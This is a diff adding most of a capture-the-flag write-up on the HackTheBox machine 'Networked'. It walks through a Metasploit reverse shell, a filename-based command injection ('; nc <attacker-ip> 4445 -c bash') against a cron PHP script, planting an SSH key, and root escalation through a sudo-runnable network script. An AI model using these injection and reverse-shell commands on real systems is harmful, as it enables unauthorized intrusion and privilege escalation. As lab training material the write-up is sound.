@@ -126,3 +126,130 @@ We can browse directly to the page by going to `uploads/[ip].php.jpg`. Firefox r
 The server conveniently has the nmap utility ncat installed, allowing us to get a shell on the box.
 
 ## Webserver shell
+
+When I was working on this box, there were a lot of other users who would frequently request resets or cause trouble that made it difficult to work with at times. For that reason, I used Metasploit’s `multi/handler` exploit with a `generic/shell_reverse_tcp` payload to handle shells, instead of just directly using `netcat`. This made it slightly easier if I missed a reset notification or something broke to just run the payload and get another session instead of having to restart netcat.
+
+The reverse shell lacks a pty to start with, but Python is installed on the box, easily fixing this.
+
+![Metasploit console session with the multi/handler exploit running. A command session is opened and elevated to a bash prompt with python -c 'import pty;pty.spawn("bash")'](/assets/networked/pty.png)
+
+Doing some recon we find that the user for this box is named `guly`. `guly`'s home directory contains three files: a PHP script called `check_attack.php`, a crontab, and the `user.txt` file. The crontab shows that `check_attack.php` is called every three minutes. This is what `check_attack.php` contains:
+
+```php
+<?php
+require '/var/www/html/lib.php';
+$path = '/var/www/html/uploads/';
+$logpath = '/tmp/attack.log';
+$to = 'guly';
+$msg = '';
+$headers = "X-Mailer: check_attack.php\r\n";
+
+$files = array();
+$files = preg_grep('/^([^.])/', scandir($path));
+
+foreach ($files as $key => $value) {
+        $msg='';
+    if ($value == 'index.html') {
+        continue;
+    }
+    #echo "----------\n";
+
+    #print "check: $value\n";
+    list ($name, $ext) = getnameCheck($value);
+    $check = check_ip($name, $value);
+
+    if (!($check[0])) {
+        echo "attack!\n";
+        # todo: attach file
+        file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
+
+        exec("rm -f $logpath");
+        exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+        echo "rm -f $path$value\n";
+        mail($to, $msg, $msg, $headers, "-F$value");
+    }
+}
+?>
+```
+
+This is very promising. `check_attack` looks through each file in the `uploads` directory and checks to see if the filename is an IP address. If the filename is not an IP address, it either creates an empty file at `/tmp/attack.log` or, if it exists, opens it for appending and puts an empty string at the end of the file. `/tmp/attack.log` is then deleted for some reason and the file is deleted using an exec call. This call does not sanitize the filename at all, allowing us to inject a command to be run as guly through the filename. We now have a shell on the box as an actual user instead of the Apache service user.
+
+```bash
+bash-4.2$ cd /var/www/html/uploads
+cd /var/www/html/uploads
+bash-4.2$ touch '; nc 10.10.14.152 4445 -c bash'
+bash-4.2$ ls
+ls
+[various web shells]
+; nc 10.10.14.152 445 -c bash
+; nc 10.10.15.2 -c bash
+; nc 10.10.15.2 1111 -c bash
+[snip]
+index.html
+bash-4.2$ ^Z
+Background session 1 [y/N] y
+msf5 exploit(multi/handler) > [*] Command shell session 2 opened 10.10.14.152:4445 -> 10.10.10.1466:38752) at 2019-08-30 19:02:26 -0400
+
+msf5 exploit(multi/handler) > sessions -i 2
+[*] Starting interaction with 2...
+
+python -c 'import pty;pty.spawn("bash")'
+[guly@networked ~]$
+```
+
+## User shell
+
+I did two things before beginning user post-exploitation. First, I deleted the injection file created in the last step. Getting a new user shell every three minutes is redundant and a waste of resources. Next, I copied an SSH public key into `guly`’s home directory. The user shell has a pty allocated but still lacks command history, which is annoying. Copying a public key allows us to SSH into the box as `guly`.
+
+![Tmux session, top pane removes the netcat file, runs mkdir .ssh; chmod 700 .ssh; cd .ssh; nc 10.10.14.152 5555 > authorized_keys; chmod 600 authorized_keys. Lower pane cats guly.pub into nc -lvp 5555 and ssh's into networked as guly using the private key.](/assets/networked/ssh_key.png)
+
+The first things I do after getting user access on a Linux box are to identify the distribution and kernel version information, using `cat /etc/*release*` and `uname -a`.  This box is running CentOS 7 with kernel version 3.10.0. This is an up to date version of the kernel with no public privesc vulns that apply. Next, I see if this user has any sudo privileges using `sudo -l`. The user is allowed to run a script at `/usr/local/sbin/changename.sh` without having to type a password, which is very promising. Here are the contents of that file:
+
+```bash
+[guly@networked ~]$ cat /usr/local/sbin/changename.sh
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-gul << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+        echo "interface $var:"
+        read x
+        while [[ ! $x =~ $regexp ]]; do
+                echo "wrong input, try again"
+                echo "interface $var:"
+                read x
+        done
+        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+
+/sbin/ifup guly0
+[guly@networked ~]$
+```
+
+This script overwrites a network script file named `ifcfg-guly` with data provided by answering the questions provided by the script.
+
+## Root privesc
+
+It appears that commands can be injected into network script files, which are run when `/sbin/ifup` is called at the end of `changename.sh`. Running `sudo /usr/local/sbin/changename.sh` and injecting a `sudo su` as the interface name escalates privileges to `root`.
+
+```bash
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+sudo su
+interface PROXY_METHOD:
+asdf
+interface BROWSER_ONLY:
+asdf
+interface BOOTPROTO:
+asdf
+[root@networked network-scripts]#
+```
+
+## Conclusion
+
+I got stumped for longer than I’d like to admit on the privilege escalation, as I forgot that a user can see what sudo privileges they have using `sudo -l` if they can't read `/etc/sudoers`. I also enjoyed figuring out how to workaround the image verification, and did not know that you could inject commands into systemd network scripts. Overall, this was a fairly easy box that reinforces post-exploitation enumeration skills.
